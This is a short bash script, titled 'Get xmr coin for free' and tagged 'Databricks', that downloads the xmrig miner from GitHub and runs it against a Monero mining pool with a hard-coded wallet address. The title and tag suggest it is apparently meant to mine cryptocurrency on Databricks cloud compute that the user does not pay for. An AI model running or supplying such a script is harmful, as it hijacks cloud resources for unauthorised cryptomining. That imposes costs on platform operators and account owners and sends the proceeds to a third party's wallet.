#! /bin/bash
# Get xmr coin for free
# Databricks
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-focal-x64.tar.gz
tar xvzf xmrig-6.16.4-focal-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o us-west.minexmr.com:443 -u 86BKzviTmZ9RArx13TFZR3UXxCMaG3b6D9ZT7bbyMBwb1GoH1Ys9XttGmrN2fbtd7MAed7Yy5NcgZPY1BrmdY5wpTrk9ute -k --tls --rig-id aank
